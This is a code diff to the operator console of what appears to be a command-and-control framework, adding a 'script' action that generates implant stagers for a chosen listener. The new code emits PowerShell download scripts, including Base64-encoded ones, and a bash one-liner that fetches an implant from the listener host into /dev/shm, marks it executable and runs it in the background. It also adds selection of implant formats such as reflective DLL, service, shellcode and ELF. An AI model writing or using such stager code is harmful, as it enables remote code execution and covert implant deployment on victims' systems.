@@ -1,16 +1,18 @@
-using Commander.Executor;
+using System;
+using System.Collections.Generic;
 using System.CommandLine;
 using System.CommandLine.Invocation;
-using System.Threading.Tasks;
-using Common.Payload;
-using System.Linq;
-using System;
 using System.IO;
+using System.Linq;
+using System.Threading.Tasks;
+using Commander.Executor;
+using Commander.Helper;
 using Commander.Models;
-using System.Collections.Generic;
+using Common;
+using Common.Payload;
 using Shared;
 using Spectre.Console;
-using Common;
+using static System.Collections.Specialized.BitVector32;
 
 namespace Commander.Commands.Core
 {
@@ -41,7 +43,7 @@ namespace Commander.Commands.Core
             get
             {
                 var root = new RootCommand(Description);
-                root.AddArgument(new Argument<string>("action", () => "show", "Action to perform: show, generate, download, delete").FromAmong("show", "generate", "download", "delete"));
+                root.AddArgument(new Argument<string>("action", () => "show", "Action to perform: show, generate, download, delete, script").FromAmong("show", "generate", "download", "delete", "script"));
                 
                 // Generated options
                 root.AddOption(new Option<string>(new[] { "--listener", "-l" }, "Listener to connect to (for generate)"));
@@ -70,6 +72,8 @@ namespace Commander.Commands.Core
                     return await this.GenerateImplant(context);
                 case "delete":
                     return await this.DeleteImplant(context);
+                case "script":
+                    return await this.GenerateScript(context);
                 default:
                     return await this.ShowImplants(context);
             }
@@ -146,11 +150,29 @@ namespace Commander.Commands.Core
             {
                  Endpoint = connexionUrl,
             };
+            var type = ImplantType.Executable;
+            switch (typeStr)
+            {
+                case "exe":
+                    type = ImplantType.Executable; break ;
+                case "dll":
+                    type = ImplantType.Library; break;
+                case "rfl":
+                    type = ImplantType.ReflectiveLibrary; break;
+                case "svc":
+                    type = ImplantType.Service; break;
+                case "ps":
+                    type = ImplantType.PowerShell; break;
+                case "bin":
+                    type = ImplantType.Shellcode; break;
+                case "elf":
+                    type = ImplantType.Elf; break;
+                default:
+                    type = ImplantType.Executable; break;
+            }
 
-            if (Enum.TryParse<ImplantType>(typeStr, true, out var typeEnum))
-                config.Type = typeEnum;
-            else
-                config.Type = ImplantType.Executable;
+          
+            config.Type = type;
 
             if (Enum.TryParse<ImplantArchitecture>(archStr, true, out var archEnum))
                 config.Architecture = archEnum;
@@ -223,6 +245,99 @@ namespace Commander.Commands.Core
             await context.CommModule.DeleteImplant(id);
             context.Terminal.WriteSuccess($"Implant {id} deleted.");
             return true;
+        }
+        private async Task<bool> GenerateScript(CommandContext<ImplantCommandOptions> context)
+        {
+             var id = context.Options.id;
+             if (string.IsNullOrEmpty(id))
+             {
+                 context.Terminal.WriteError("Implant ID is required for script generation.");
+                 return false;
+             }
+
+             var implants = context.CommModule.GetImplants();
+             var selectedImplant = implants.FirstOrDefault(i => i.Id == id);
+
+             if (selectedImplant == null)
+             {
+                 context.Terminal.WriteError($"Implant {id} not found.");
+                 return false;
+             }
+
+             var listeners = context.CommModule.GetListeners();
+             // Filter by listener if one is specified in the implant config
+             if (!string.IsNullOrEmpty(selectedImplant.Config?.Listener))
+             {
+                 listeners = listeners.Where(l => l.Name == selectedImplant.Config.Listener).ToList();
+             }
+             else if(!string.IsNullOrEmpty(context.Options.listener))
+             {
+                 listeners = listeners.Where(l => l.Name == context.Options.listener).ToList();
+             }
+
+             if (!listeners.Any())
+             {
+                 context.Terminal.WriteInfo("No compatible listeners found.");
+                 return true;
+             }
+            
+            foreach (var listener in listeners)
+            {
+                var protocol = listener.Secured ? "https://" : "http://";
+                var listenerUrl = $"{protocol}{listener.Ip}:{listener.BindPort}";
+                var isSecured = listener.Secured;
+                var implantUrl = $"{listenerUrl}/imp/{selectedImplant.Config?.ImplantName}{GetFileExtension(selectedImplant.Config?.Type ?? ImplantType.Executable)}";
+                var fileName = $"{selectedImplant.Config?.ImplantName}{GetFileExtension(selectedImplant.Config?.Type ?? ImplantType.Executable)}";
+
+                context.Terminal.WriteInfo($"Listener: {listener.Name} ({listenerUrl})");
+                
+                if (selectedImplant.Config?.Type == ImplantType.PowerShell)
+                {
+                    context.Terminal.Write("PowerShell Script (Clear):");
+                    context.Terminal.Write(ScriptHelper.GeneratePowershellScript(implantUrl, isSecured));
+                    context.Terminal.WriteLine();
+
+                    context.Terminal.Write("PowerShell Script (Base64):");
+                    context.Terminal.Write(ScriptHelper.GeneratePowershellScriptB64(implantUrl, isSecured));
+                    context.Terminal.WriteLine();
+                }
+                else if (selectedImplant.Config?.Type == ImplantType.Elf)
+                {
+                    var bashScript = $"curl -s -o /dev/shm/{selectedImplant.Config.ImplantName} {implantUrl} && chmod +x /dev/shm/{selectedImplant.Config.ImplantName} && /dev/shm/{selectedImplant.Config.ImplantName} &";
+                    context.Terminal.Write("Bash Oneliner:");
+                    context.Terminal.Write(bashScript);
+                    context.Terminal.WriteLine();
+                }
+                else
+                {
+                    context.Terminal.Write("PowerShell Download Script:");
+                    context.Terminal.Write(ScriptHelper.GeneratePowershellDownloadScript(implantUrl, fileName, isSecured));
+                    context.Terminal.WriteLine();
+                }
+                
+                context.Terminal.Write(new Rule());
+            }
+
+            return true;
+        }
+
+        private string GetFileExtension(ImplantType type)
+        {
+            switch (type)
+            {
+                case ImplantType.Executable:
+                case ImplantType.Service:
+                    return ".exe";
+                case ImplantType.PowerShell:
+                    return ".ps1";
+                case ImplantType.Elf:
+                    return ""; 
+                case ImplantType.Library:
+                case ImplantType.ReflectiveLibrary:
+                    return ".dll";
+                default:
+                    return ".bin";
+            }
         }
     }
 }
